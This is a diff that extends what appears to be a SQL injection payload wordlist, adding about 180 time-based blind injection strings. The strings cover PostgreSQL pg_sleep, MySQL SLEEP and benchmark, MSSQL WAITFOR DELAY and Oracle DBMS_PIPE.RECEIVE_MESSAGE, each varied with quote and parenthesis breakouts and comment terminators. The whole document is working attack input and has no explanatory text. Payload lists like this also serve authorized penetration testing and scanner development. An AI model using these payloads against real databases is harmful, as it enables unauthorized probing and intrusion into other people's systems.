@@ -1248,3 +1248,183 @@ DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)/*" or DBMS_PIPE.RECEIVE_MESSAGE('asfd',5) or
 "||benchmark(50000000,MD5(1))#
 '||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)#
 "||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)#
+)||pg_sleep(5)
+')||pg_sleep(5)
+")||pg_sleep(5)
+)||SELECT pg_sleep(5)
+')||SELECT pg_sleep(5)
+")||SELECT pg_sleep(5)
+)||UNION SELECT pg_sleep(5)
+')||UNION SELECT pg_sleep(5)
+")||UNION SELECT pg_sleep(5)
+)||SLEEP(5)
+')||SLEEP(5)
+")||SLEEP(5)
+)||SELECT SLEEP(5)
+')||SELECT SLEEP(5)
+")||SELECT SLEEP(5)
+)||UNION SELECT SLEEP(5)
+')||UNION SELECT SLEEP(5)
+")||UNION SELECT SLEEP(5)
+)||WAITFOR DELAY '0:0:5'
+')||WAITFOR DELAY '0:0:5'
+")||WAITFOR DELAY '0:0:5'
+)||WAITFOR DELAY "0:0:5"
+')||WAITFOR DELAY "0:0:5"
+")||WAITFOR DELAY "0:0:5"
+)||benchmark(50000000,MD5(1))
+')||benchmark(50000000,MD5(1))
+")||benchmark(50000000,MD5(1))
+)||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)
+')||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)
+")||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)
+)||pg_sleep(5)-- -
+')||pg_sleep(5)-- -
+")||pg_sleep(5)-- -
+)||SELECT pg_sleep(5)-- -
+')||SELECT pg_sleep(5)-- -
+")||SELECT pg_sleep(5)-- -
+)||UNION SELECT pg_sleep(5)-- -
+')||UNION SELECT pg_sleep(5)-- -
+")||UNION SELECT pg_sleep(5)-- -
+)||SLEEP(5)-- -
+')||SLEEP(5)-- -
+")||SLEEP(5)-- -
+)||SELECT SLEEP(5)-- -
+')||SELECT SLEEP(5)-- -
+")||SELECT SLEEP(5)-- -
+)||UNION SELECT SLEEP(5)-- -
+')||UNION SELECT SLEEP(5)-- -
+")||UNION SELECT SLEEP(5)-- -
+)||WAITFOR DELAY '0:0:5'-- -
+')||WAITFOR DELAY '0:0:5'-- -
+")||WAITFOR DELAY '0:0:5'-- -
+)||WAITFOR DELAY "0:0:5"-- -
+')||WAITFOR DELAY "0:0:5"-- -
+")||WAITFOR DELAY "0:0:5"-- -
+)||benchmark(50000000,MD5(1))-- -
+')||benchmark(50000000,MD5(1))-- -
+")||benchmark(50000000,MD5(1))-- -
+)||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)-- -
+')||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)-- -
+")||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)-- -
+)||pg_sleep(5)#
+')||pg_sleep(5)#
+")||pg_sleep(5)#
+)||SELECT pg_sleep(5)#
+')||SELECT pg_sleep(5)#
+")||SELECT pg_sleep(5)#
+)||UNION SELECT pg_sleep(5)#
+')||UNION SELECT pg_sleep(5)#
+")||UNION SELECT pg_sleep(5)#
+)||SLEEP(5)#
+')||SLEEP(5)#
+")||SLEEP(5)#
+)||SELECT SLEEP(5)#
+')||SELECT SLEEP(5)#
+")||SELECT SLEEP(5)#
+)||UNION SELECT SLEEP(5)#
+')||UNION SELECT SLEEP(5)#
+")||UNION SELECT SLEEP(5)#
+)||WAITFOR DELAY '0:0:5'#
+')||WAITFOR DELAY '0:0:5'#
+")||WAITFOR DELAY '0:0:5'#
+)||WAITFOR DELAY "0:0:5"#
+')||WAITFOR DELAY "0:0:5"#
+")||WAITFOR DELAY "0:0:5"#
+)||benchmark(50000000,MD5(1))#
+')||benchmark(50000000,MD5(1))#
+")||benchmark(50000000,MD5(1))#
+)||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)#
+')||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)#
+")||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)#
+))||pg_sleep(5)
+'))||pg_sleep(5)
+"))||pg_sleep(5)
+))||SELECT pg_sleep(5)
+'))||SELECT pg_sleep(5)
+"))||SELECT pg_sleep(5)
+))||UNION SELECT pg_sleep(5)
+'))||UNION SELECT pg_sleep(5)
+"))||UNION SELECT pg_sleep(5)
+))||SLEEP(5)
+'))||SLEEP(5)
+"))||SLEEP(5)
+))||SELECT SLEEP(5)
+'))||SELECT SLEEP(5)
+"))||SELECT SLEEP(5)
+))||UNION SELECT SLEEP(5)
+'))||UNION SELECT SLEEP(5)
+"))||UNION SELECT SLEEP(5)
+))||WAITFOR DELAY '0:0:5'
+'))||WAITFOR DELAY '0:0:5'
+"))||WAITFOR DELAY '0:0:5'
+))||WAITFOR DELAY "0:0:5"
+'))||WAITFOR DELAY "0:0:5"
+"))||WAITFOR DELAY "0:0:5"
+))||benchmark(50000000,MD5(1))
+'))||benchmark(50000000,MD5(1))
+"))||benchmark(50000000,MD5(1))
+))||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)
+'))||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)
+"))||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)
+))||pg_sleep(5)-- -
+'))||pg_sleep(5)-- -
+"))||pg_sleep(5)-- -
+))||SELECT pg_sleep(5)-- -
+'))||SELECT pg_sleep(5)-- -
+"))||SELECT pg_sleep(5)-- -
+))||UNION SELECT pg_sleep(5)-- -
+'))||UNION SELECT pg_sleep(5)-- -
+"))||UNION SELECT pg_sleep(5)-- -
+))||SLEEP(5)-- -
+'))||SLEEP(5)-- -
+"))||SLEEP(5)-- -
+))||SELECT SLEEP(5)-- -
+'))||SELECT SLEEP(5)-- -
+"))||SELECT SLEEP(5)-- -
+))||UNION SELECT SLEEP(5)-- -
+'))||UNION SELECT SLEEP(5)-- -
+"))||UNION SELECT SLEEP(5)-- -
+))||WAITFOR DELAY '0:0:5'-- -
+'))||WAITFOR DELAY '0:0:5'-- -
+"))||WAITFOR DELAY '0:0:5'-- -
+))||WAITFOR DELAY "0:0:5"-- -
+'))||WAITFOR DELAY "0:0:5"-- -
+"))||WAITFOR DELAY "0:0:5"-- -
+))||benchmark(50000000,MD5(1))-- -
+'))||benchmark(50000000,MD5(1))-- -
+"))||benchmark(50000000,MD5(1))-- -
+))||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)-- -
+'))||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)-- -
+"))||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)-- -
+))||pg_sleep(5)#
+'))||pg_sleep(5)#
+"))||pg_sleep(5)#
+))||SELECT pg_sleep(5)#
+'))||SELECT pg_sleep(5)#
+"))||SELECT pg_sleep(5)#
+))||UNION SELECT pg_sleep(5)#
+'))||UNION SELECT pg_sleep(5)#
+"))||UNION SELECT pg_sleep(5)#
+))||SLEEP(5)#
+'))||SLEEP(5)#
+"))||SLEEP(5)#
+))||SELECT SLEEP(5)#
+'))||SELECT SLEEP(5)#
+"))||SELECT SLEEP(5)#
+))||UNION SELECT SLEEP(5)#
+'))||UNION SELECT SLEEP(5)#
+"))||UNION SELECT SLEEP(5)#
+))||WAITFOR DELAY '0:0:5'#
+'))||WAITFOR DELAY '0:0:5'#
+"))||WAITFOR DELAY '0:0:5'#
+))||WAITFOR DELAY "0:0:5"#
+'))||WAITFOR DELAY "0:0:5"#
+"))||WAITFOR DELAY "0:0:5"#
+))||benchmark(50000000,MD5(1))#
+'))||benchmark(50000000,MD5(1))#
+"))||benchmark(50000000,MD5(1))#
+))||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)#
+'))||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)#
+"))||DBMS_PIPE.RECEIVE_MESSAGE('asfd',5)#
